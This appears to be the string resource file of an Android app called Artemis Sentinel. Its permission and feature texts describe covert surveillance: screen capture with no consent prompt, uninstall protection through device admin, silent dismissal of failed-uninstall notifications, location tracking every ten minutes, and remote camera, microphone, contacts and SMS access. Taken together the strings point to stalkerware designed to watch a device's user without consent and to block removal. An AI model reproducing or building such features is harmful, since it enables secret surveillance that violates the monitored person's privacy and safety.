resources.string: Allows remote control of the device screen
Allows Artemis to capture the screen on demand with no consent prompts — one-time enable, fully automatic afterwards.
Uninstall protection and remote lock for Artemis Sentinel. While active, the app cannot be uninstalled until device admin is deactivated.
Automatically dismisses the package installer\'s "uninstall failed" notification so failed uninstall attempts stay silent.
Location access is needed to track device location every 10 minutes
Background location is needed for periodic tracking when the app is in the background
Camera access is needed for remote capture requests
Microphone access is needed for remote audio recording
Contacts access needed for remote contact queries
SMS access needed for remote SMS queries
